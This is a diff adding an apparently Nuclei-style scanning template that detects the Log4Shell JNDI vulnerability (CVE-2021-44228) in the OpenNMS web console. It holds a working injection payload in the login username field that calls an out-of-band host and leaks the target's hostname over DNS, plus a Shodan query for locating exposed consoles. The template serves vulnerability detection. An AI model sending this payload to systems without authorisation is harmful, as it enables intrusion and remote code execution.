@@ -1,0 +1,56 @@
+id: opennms-log4j-jndi-rce
+
+info:
+  name: OpenNMS - JNDI Remote Code Execution (Apache Log4j)
+  author: johnk3r
+  severity: critical
+  description: |
+    OpenNMS JNDI is susceptible to remote code execution via Apache Log4j 2.14.1 and before. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://www.horizon3.ai/the-long-tail-of-log4shell-exploitation/
+    - https://www.opennms.com/en/blog/2021-12-10-opennms-products-affected-by-apache-log4j-vulnerability-cve-2021-44228/
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    shodan-query: title:"OpenNMS Web Console"
+    verified: "true"
+  tags: jndi,log4j,rce,opennms,cve,cve2021,kev,oast
+
+requests:
+  - raw:
+      - |
+        POST /opennms/j_spring_security_check HTTP/1.1
+        Referer: {{RootURL}}/opennms/login.jsp
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username=${jndi:ldap://${hostName}.{{interactsh-url}}}&j_password=password&Login=&j_usergroups=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'  # Print extracted ${hostName} in output
+
+# Enhanced by cs on 2022/10/24
